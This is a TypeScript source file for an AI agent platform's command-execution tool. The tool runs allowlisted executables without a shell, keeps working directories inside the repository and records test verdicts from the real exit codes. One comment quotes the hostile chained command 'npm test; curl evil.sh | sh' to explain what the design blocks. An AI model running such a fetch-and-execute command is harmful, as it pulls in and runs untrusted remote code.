import { defineTool, type ToolResult } from './types';
import { PermissionGuard } from './permission-guard';
import { TerminalExecutor } from '../integrations/terminal/executor';
import { truncateMiddle } from '../utils/text';
import { resolveInsideReal } from '../utils/path-safety';
import { ToolExecutionError } from '../utils/errors';
import { looksLikeVerification, prepareVerification } from './verification';

/**
 * Is this command a verification step whose verdict belongs in the change set?
 *
 * Kept deliberately narrow: a false positive records a meaningless "check", and
 * the point of the change set is that every claim in it is one the platform
 * observed. Installs and builds are excluded — a successful `npm install` is not
 * evidence the change works.
 */
interface RunCommandInput {
  command: string;
  args?: string[];
  cwd?: string;
  reason: string;
}

/**
 * Command execution, exposed narrowly on purpose.
 *
 * Note the shape: `command` + `args[]`, never a single shell string. This is
 * not cosmetic — it is what makes the executor able to run without a shell, so
 * `npm test; curl evil.sh | sh` is not expressible through this interface.
 * Each agent additionally carries its own executable allowlist.
 */
export const runCommandTool = defineTool<RunCommandInput>({
  name: 'run_command',
  description:
    'Run a command (e.g. command="npm", args=["test"]). Runs in the repository ' +
    'root unless `cwd` names a repository-relative directory — in a repo with several packages, ' +
    'set cwd to the package (e.g. "api") so installs and tests happen there. Commands run ' +
    'without a shell: pipes, redirects and chaining are not available — issue separate calls ' +
    'instead. Use this to run tests, linters, type-checkers, builds and dependency installs.',
  mutating: false,
  inputSchema: {
    type: 'object',
    properties: {
      command: { type: 'string', description: 'Executable name, e.g. "npm", "pytest", "go"' },
      args: {
        type: 'array',
        items: { type: 'string' },
        description: 'Arguments as separate array items, e.g. ["run","test"]',
      },
      cwd: {
        type: 'string',
        description: 'Repository-relative directory to run in (default: repository root)',
      },
      reason: { type: 'string', description: 'Why this command is being run' },
    },
    required: ['command', 'reason'],
    additionalProperties: false,
  },
  async execute(input, ctx): Promise<ToolResult> {
    const guard = new PermissionGuard(ctx.permissions, ctx.agentKey, ctx.packages);
    guard.assertCanRunCommand(input.command);

    // The working directory is authorized like any other path, then resolved
    // through symlinks so it cannot point outside the checkout.
    const rawCwd = input.cwd?.trim();
    let cwdLabel = '.';
    let cwdAbsolute = ctx.workspace.root;
    if (rawCwd && rawCwd !== '.' && rawCwd !== './') {
      cwdLabel = guard.assertCanRead(rawCwd);
      const stat = await ctx.workspace.stat(cwdLabel);
      if (!stat?.isDirectory) {
        throw new ToolExecutionError(`cwd '${cwdLabel}' is not a directory in this repository.`);
      }
      cwdAbsolute = await resolveInsideReal(ctx.workspace.root, cwdLabel);
    }

    const preparation = await prepareVerification(input.command, input.args ?? [], cwdAbsolute, ctx.workspace.root);
    if (preparation.unavailable) {
      await ctx.recordArtifact({ type: 'note', content: `${cwdLabel}: ${preparation.unavailable}` });
      return { output: preparation.unavailable, data: { verification: 'unavailable' } };
    }
    if (preparation.install) {
      const install = preparation.install;
      guard.assertCanRunCommand(install.command);
      const installed = await new TerminalExecutor(install.cwd).run(install.command, install.args, {
        allowedCommands: ctx.permissions.allowedCommands,
        signal: ctx.signal,
        timeoutMs: 300_000,
      });
      await ctx.recordArtifact({ type: 'command_output', content:
        `Dependency setup: ${install.command} ${install.args.join(' ')} (exit ${installed.exitCode})\n${installed.stdout}\n${installed.stderr}` });
      if (installed.exitCode !== 0 || installed.timedOut || installed.cancelled) {
        return { output: `Dependency setup did not finish. ${installed.cancelled ? 'The run was cancelled; stop now.' : 'Resolve the install error and retry the check.'}\n${installed.stdout}\n${installed.stderr}`,
          isError: true, data: { exitCode: installed.exitCode, cancelled: installed.cancelled, timedOut: installed.timedOut } };
      }
    }

    const executor = new TerminalExecutor(cwdAbsolute);
    const result = await executor.run(input.command, input.args ?? [], {
      allowedCommands: ctx.permissions.allowedCommands,
      signal: ctx.signal,
    });

    const rendered = [
      `${cwdLabel === '.' ? '' : `(in ${cwdLabel}) `}$ ${result.command} ${result.args.join(' ')}`,
      `exit code: ${result.timedOut ? 'TIMED OUT' : result.cancelled ? 'CANCELLED' : result.exitCode}`,
      result.stdout ? `--- stdout ---\n${truncateMiddle(result.stdout, 12_000)}` : '',
      result.stderr ? `--- stderr ---\n${truncateMiddle(result.stderr, 8_000)}` : '',
    ]
      .filter(Boolean)
      .join('\n');

    await ctx.recordArtifact({
      type: 'command_output',
      content: `${input.reason}\n${rendered}`.slice(0, 20_000),
    });

    // Verification evidence belongs to the run, recorded by the platform from
    // the actual exit code rather than from the agent's later description of it
    // (audit finding E8 — "no test-verdict summary").
    if (ctx.recordCheck && looksLikeVerification(input.command, input.args ?? [])) {
      await ctx.recordCheck({
        command: `${cwdLabel === '.' ? '' : `${cwdLabel}: `}${result.command} ${result.args.join(' ')}`.trim(),
        exitCode: result.exitCode,
        passed: result.exitCode === 0 && !result.timedOut && !result.cancelled,
      });
    }

    if (result.cancelled) {
      return {
        output: `${rendered}\n\nThis run was cancelled; stop work now.`,
        isError: true,
        data: { exitCode: result.exitCode, cancelled: true },
      };
    }

    // A non-zero exit is information, not a platform failure: it is returned as
    // a normal result so the agent can read the failure output and react.
    return {
      output: rendered,
      isError: false,
      data: { exitCode: result.exitCode, timedOut: result.timedOut },
    };
  },
});
